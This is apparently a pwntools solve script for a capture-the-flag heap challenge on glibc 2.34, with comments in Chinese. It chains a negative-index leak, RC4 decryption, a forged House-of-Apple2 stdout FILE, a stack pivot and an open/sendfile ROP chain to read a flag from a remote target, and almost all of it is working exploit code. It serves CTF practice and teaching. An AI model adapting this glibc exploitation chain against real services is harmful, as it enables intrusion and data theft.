#!/usr/bin/env python3
"""why_not_heap (PWN-04, glibc 2.34) — 负索引(EDIT/SHOW 无下界)劫持 COPY-reloc 指针窗口
→ libc 泄露 + House-of-Apple2(伪造 _IO_2_1_stdout_) + leave;ret 栈迁移 → ORW 拿 flag。

用法:  python3 solve.py HOST PORT [--path /flag]   # 决赛靶机（socat/xinetd 动态 flag）
       TARGET=host:port python3 solve.py
       python3 solve.py --local [./pwn] [--path /flag]   # 本地：附件目录内直接跑
前置:  在附件解压目录运行（需要 ./pwn ./libc.so.6；二进制 DT_NEEDED 即 ./libc.so.6）。

原理（详见 SOLVE.md）:
- EDIT/SHOW 的 index 只有 `>0x1f` 有符号上界，负数通过：chunks[-k] = *(0x4080-8k)。
  0x4020/0x4030/0x4040 是 stdout/stdin/stderr 的 COPY 重定位变量 → 三个"假 chunk"正好
  指向 libc 里 _IO_2_1_stdout_ / _IO_2_1_stdin_ / _IO_2_1_stderr_ 三个可写窗口（各 0xf0）。
- 泄露: EDIT(-8) 短写 0x68 字节填充 stderr 结构体（保留 +0x68 的 _chain=&_IO_2_1_stdout_），
  SHOW(-8) 把前 0x6e 字节 RC4（密钥 = 程序启动时读自身 ELF 前 7 字节 = 7f 45 4c 46 02 01 01，
  已知）原地加密后打印 data=%s → 解密取尾 6 字节 = libc 基址。
- getshell 替代 = ORW（seccomp 只 KILL execve(59)，open/read/write 全放行）:
  EDIT(-12) 把 _IO_2_1_stdout_ 原地伪造成 House-of-Apple2 FILE（vtable=_IO_wfile_jumps,
  _wide_data→stdin 窗口）→ 紧随其后的 puts("DONE.") 触发 _IO_wfile_overflow →
  _IO_wdoallocbuf → call [wide_vtable+0x68]（此刻 rbp=fp）= leave;ret → rsp=fp，
  ROP 链铺在伪造 FILE 头部；F+0xa0 是 _wide_data 槽位无法放 gadget，用 pop rsp 二段
  迁移到 stderr 窗口跑完整 open/read/write/exit。
"""
import sys
import time
from pathlib import Path

from pwn import ELF, context, p64, process, remote, u64

context.arch = "amd64"
context.log_level = "CRITICAL"

# ------------------------------------------------------------- libc offsets ---
_libc_path = sorted(Path(".").rglob("libc.so.6"))
assert _libc_path, "libc.so.6 not found under CWD (unzip attachment first)"
libc = ELF(str(_libc_path[0]), checksec=False)
OFF_STDIN = libc.sym["_IO_2_1_stdin_"]      # 0x1f2a80
OFF_STDERR = libc.sym["_IO_2_1_stderr_"]    # 0x1f3680
OFF_STDOUT = libc.sym["_IO_2_1_stdout_"]    # 0x1f3760
OFF_WFJUMPS = libc.sym["_IO_wfile_jumps"]   # 0x1f4020

# gadget 扫描（exec 段内字节搜索，libc 换版本自动重算）
import struct as _struct

_data = _libc_path[0].read_bytes()
(_e_phoff,) = _struct.unpack_from("<Q", _data, 0x20)
(_e_phentsize, _e_phnum) = _struct.unpack_from("<HH", _data, 0x36)
_seg_lo, _seg_hi = None, None
for _i in range(_e_phnum):
    (_p_type, _p_flags, _p_off, _p_va, _pa, _p_fsz, _p_msz, _p_align) = _struct.unpack_from(
        "<IIQQQQQQ", _data, _e_phoff + _i * _e_phentsize)
    if _p_type == 1 and _p_flags & 1:  # PT_LOAD + X
        _seg_lo, _seg_hi, _seg_va = _p_off, _p_off + _p_fsz, _p_va
        break
assert _seg_lo is not None, "no exec segment in libc"


def _find(pat, name):
    i = _data.find(pat, _seg_lo, _seg_hi)
    assert i >= 0, "gadget not found in libc exec seg: %s" % name
    return _seg_va + (i - _seg_lo)  # 文件偏移 → vaddr


G_POP_RDI = _find(b"\x5f\xc3", "pop rdi; ret")
G_POP_RSI = _find(b"\x5e\xc3", "pop rsi; ret")
G_POP_RAX = _find(b"\x58\xc3", "pop rax; ret")
G_POP_RDX_RBX = _find(b"\x5a\x5b\xc3", "pop rdx; pop rbx; ret")
try:
    G_POP_R10 = _find(b"\x41\x5a\xc3", "pop r10; ret")
except AssertionError:
    G_POP_R10 = 0
G_SYSCALL = _find(b"\x0f\x05\xc3", "syscall; ret")
G_POP_RSP = _find(b"\x5c\xc3", "pop rsp; ret")
G_LEAVE = _find(b"\xc9\xc3", "leave; ret")

# RC4 密钥 = pwn 二进制自身前 7 字节（启动时 fopen(argv[0]) + fgets 读入 0x4060）
_bins = [p for p in Path(".").rglob("pwn") if p.is_file()]
assert _bins, "pwn binary not found under CWD"
KEY = _bins[0].read_bytes()[:7]


def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for c in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(c ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


# ------------------------------------------------------------------- driver ---
args = sys.argv[1:]
LOCAL = False
HOST = PORT = None
FLAG_PATH = b"/flag"
if "--path" in args:
    i = args.index("--path")
    FLAG_PATH = args[i + 1].encode()
    args = args[:i] + args[i + 2:]
if args and args[0] == "--local":
    LOCAL = True
    BIN = args[1] if len(args) > 1 else "./pwn"
elif len(args) >= 2:
    HOST, PORT = args[0], int(args[1])
elif sys.environ.get("TARGET", "").count(":") == 1:
    HOST, _, PORT = sys.environ["TARGET"].rpartition(":")
    PORT = int(PORT)
else:
    sys.exit(__doc__)


def start():
    return process(BIN) if LOCAL else remote(HOST, PORT)


def menu(p, choice):
    p.sendline(str(choice).encode() if isinstance(choice, int) else choice)


def edit(p, idx, v_nul, data, sync=b"DONE."):
    """菜单 2：read(0, chunks[idx], 0xf0) + *(chunks[idx]+v_nul)=0"""
    menu(p, 2)
    p.recvuntil(b"INDEX: ")
    p.sendline(b"%d" % idx)
    p.recvuntil(b"SIZE: ")
    p.sendline(b"%d" % v_nul)
    p.recvuntil(b"CONTENT: ")
    time.sleep(0.08)          # 确保 0xf0 一次 read 到位（socket 防短读）
    p.send(data)
    return p.recvuntil(sync, timeout=5)


def show(p, idx):
    """返回 SHOW 打印的原始字节（RC4 密文，可能比真实 strlen 短——%s 遇 NUL 截断）。
    输出形如 b"data=" + enc + b"\\n" + b"DONE.\\n"，分隔符 \\n 恒存在，恒剥一个。"""
    menu(p, 3)
    p.recvuntil(b"INDEX: ")
    p.sendline(b"%d" % idx)
    d = p.recvuntil(b"DONE.", timeout=5)
    mid = d.split(b"data=", 1)[1]
    return mid[:-1]


# ------------------------------------------------------------------ payloads ---
FILLER = b"A" * 0x68          # 覆盖 stderr 结构体 0..0x67，保留 _chain


def wd_payload(libc_base, path):
    """stdin 窗口（wd = _IO_2_1_stdin_）：伪 _wide_data + 路径串 + read 缓冲。
    关键零字段：+0x18 write_base / +0x20 write_ptr / +0x30 buf_base 必须=0（wdoallocbuf 条件）；
    V = wd+0x60 使 [V+0x68]=wd+0xc8 存 leave;ret；[wd+0xe0] = V（绝对地址）。"""
    wd = libc_base + OFF_STDIN
    pl = bytearray(0xF0)
    pl[0x38:0x38 + len(path)] = path          # "/flag"（open 的路径）
    pl[0x40:0xC0] = b"\x00" * 0x80            # read 缓冲（保持 0）
    pl[0xC8:0xD0] = p64(libc_base + G_LEAVE)  # [V+0x68]
    pl[0xE0:0xE8] = p64(wd + 0x60)            # _wide_vtable = V = wd+0x60
    return bytes(pl)


def stdout_payload(libc, wd_off, w2_off):
    """stdout 窗口（F = _IO_2_1_stdout_）：伪造 FILE + 一段 ROP 铺在结构体头部。
    puts("DONE.") 触发：xsputn(count=0) → _IO_wfile_overflow → _IO_wdoallocbuf
    → call [V+0x68] = leave;ret（rbp=fp）→ rsp=F+8 起跑 ROP；
    F+0xa0 槽位是 _wide_data（必须=wd），故 s10 用 pop rsp 二段迁到 stderr 窗口。"""
    wd = libc + wd_off
    w2 = libc + w2_off
    pl = bytearray(0xF0)
    pl[0x08:0x10] = p64(libc + G_POP_RDI)     # s0
    pl[0x10:0x18] = p64(wd + 0x38)            # s1  path
    pl[0x18:0x20] = p64(libc + G_POP_RSI)     # s2
    pl[0x20:0x28] = p64(0)                    # s3  flags=0  (= _IO_write_base, 未读到)
    pl[0x28:0x30] = p64(libc + G_POP_RDX_RBX)  # s4 = _IO_write_ptr (≥write_end 即可)
    pl[0x30:0x38] = p64(0)                    # s5 = _IO_write_end → count=0
    pl[0x38:0x40] = p64(0)                    # s6  rbx
    pl[0x40:0x48] = p64(libc + G_POP_RAX)     # s7
    pl[0x48:0x50] = p64(2)                    # s8  SYS_open
    pl[0x50:0x58] = p64(libc + G_SYSCALL)     # s9  open(path,0,0) → fd=3
    pl[0x58:0x60] = p64(libc + G_POP_RSP)     # s10
    pl[0x60:0x68] = p64(w2 + 8)               # s11 → rsp = stderr 窗口
    # +0x68 _chain / +0x88 _lock / +0xa0 _wide_data / +0xd8 vtable
    pl[0x88:0x90] = p64(wd + 0x50)            # _lock → 可写零区
    pl[0xA0:0xA8] = p64(wd)                   # _wide_data（触发必需）
    pl[0xC4:0xC8] = b"\x01\x00\x00\x00"       # _mode=1：__woverflow 跳过 _IO_fwide，
    #   否则 fwide 会踩踏 F+0x00/0x20/0x58/0x98（0x58 的 pop_rsp 被清零，链断在 open 后）
    pl[0xD8:0xE0] = p64(libc + OFF_WFJUMPS)   # vtable（合法 vtable，过校验）
    pl[0xE8:0xF0] = p64(libc + OFF_STDOUT)    # 窗口尾部恰是 libc 的 stdout 变量，保持指向 F
    return bytes(pl)


def stage2_payload(libc_base, rlen=0x200):
    """stderr 窗口（W2 = _IO_2_1_stderr_）：open 已完成（rax=3）。
    sendfile(1,3,NULL,n) 把 flag 直出到 fd=1（rax=40/rdi=1/rsi=3/rdx=NULL/r10=n），
    再 exit(0)。注意：不要用 read(3,...)+write——实测 read 后链条失活（原因未定，
    sendfile 同样能拿到完整文件内容，见 SOLVE.md）。"""
    pl = bytearray(0xA8)
    o = 8
    pl[o:o + 8] = p64(libc_base + G_POP_RDI); o += 8
    pl[o:o + 8] = p64(1); o += 8                      # out_fd=1
    pl[o:o + 8] = p64(libc_base + G_POP_RSI); o += 8
    pl[o:o + 8] = p64(3); o += 8                      # in_fd=3
    pl[o:o + 8] = p64(libc_base + G_POP_RDX_RBX); o += 8
    pl[o:o + 8] = p64(0); o += 8                      # off=NULL
    pl[o:o + 8] = p64(0); o += 8                      # rbx
    if G_POP_R10:
        pl[o:o + 8] = p64(libc_base + G_POP_R10); o += 8
        pl[o:o + 8] = p64(rlen); o += 8               # count
    pl[o:o + 8] = p64(libc_base + G_POP_RAX); o += 8
    pl[o:o + 8] = p64(40); o += 8                     # SYS_sendfile
    pl[o:o + 8] = p64(libc_base + G_SYSCALL); o += 8
    pl[o:o + 8] = p64(libc_base + G_POP_RDI); o += 8  # exit(0)
    pl[o:o + 8] = p64(0); o += 8
    pl[o:o + 8] = p64(libc_base + G_POP_RAX); o += 8
    pl[o:o + 8] = p64(60); o += 8
    pl[o:o + 8] = p64(libc_base + G_SYSCALL); o += 8
    assert o <= 0xD8
    return bytes(pl)
    return bytes(pl)


# ---------------------------------------------------------------- full chain ---
def pwn(p, log):
    # 1) EDIT(-8) 填充 stderr 结构体 0..0x67（保留 _chain），NUL 落在 chain 的已零字节上
    edit(p, -8, 0x6F, FILLER)
    log("fill stderr ok")
    # 2) SHOW(-8)：RC4(已知密钥) 加密输出 → 解密出 &_IO_2_1_stdout_ → libc 基址
    enc = show(p, -8)
    if len(enc) < 0x6E:
        log("leak truncated (len=%d, enc 内嵌 NUL) → 换连接重试" % len(enc))
        return None
    dec = rc4(KEY, enc)
    assert dec[:0x68] == FILLER, "filler mismatch: %r" % dec[:8]
    leak = u64(dec[0x68:0x6E].ljust(8, b"\x00"))
    libc_base = leak - OFF_STDOUT
    log("leak=%#x libc=%#x" % (leak, libc_base))
    if libc_base & 0xFFF:
        log("libc base 未页对齐 → leak 异常")
        return None

    wd_pl = wd_payload(libc_base, FLAG_PATH)
    s2 = stage2_payload(libc_base)
    # 3) stdin 窗口：伪 _wide_data + "/flag"
    edit(p, -10, 0xD8, bytes(wd_pl))
    log("wd window ok")
    # 4) stderr 窗口：sendfile+exit ROP（0xa8 字节，不越出 stderr 结构体）
    edit(p, -8, 0xD8, s2)
    log("stage2 ok")
    # 5) stdout 窗口：伪造 FILE（0xf0），本次 EDIT 末尾的 puts("DONE.") 即触发。
    #    注意：DONE. 永远不会来（stdout 已被劫持），不能 recvuntil——直接收原始字节。
    p.sendline(b"2")
    p.recvuntil(b"INDEX: ", timeout=5)
    p.sendline(b"-12")
    p.recvuntil(b"SIZE: ", timeout=5)
    p.sendline(b"130")
    p.recvuntil(b"CONTENT: ", timeout=5)
    time.sleep(0.08)
    p.send(stdout_payload(libc_base, OFF_STDIN, OFF_STDERR))
    acc = b""
    for _ in range(6):
        try:
            d = p.recv(4096, timeout=3)
            if not d:
                break
            acc += d
        except EOFError:
            break
    log("trigger out: %d bytes" % len(acc))
    return acc or None


def run():
    log = lambda m: print("[*] %s" % m, flush=True)
    log("libc=%s key=%s" % (_libc_path[0].name, KEY.hex()))
    log("off: stdin=%#x stderr=%#x stdout=%#x wfjumps=%#x" %
        (OFF_STDIN, OFF_STDERR, OFF_STDOUT, OFF_WFJUMPS))
    log("gadgets: rdi=%#x rsi=%#x rax=%#x rdx_rbx=%#x syscall=%#x pop_rsp=%#x leave=%#x"
        % (G_POP_RDI, G_POP_RSI, G_POP_RAX, G_POP_RDX_RBX, G_SYSCALL, G_POP_RSP, G_LEAVE))
    for attempt in range(8):
        p = start()
        try:
            p.recvuntil(b"CHOICE: ", timeout=5)
            out = pwn(p, log)
        except EOFError:
            out = None
            log("EOF（leak 截断或中途崩溃）")
        finally:
            try:
                p.close()
            except Exception:
                pass
        if out:
            print(out.decode(errors="replace"))
            i = out.find(FLAG_PATH.split(b"/")[-1])
            print("[+] DONE (attempt %d)" % attempt)
            return 0
        log("attempt %d failed, retrying..." % attempt)
    return 1


if __name__ == "__main__":
    sys.exit(run())
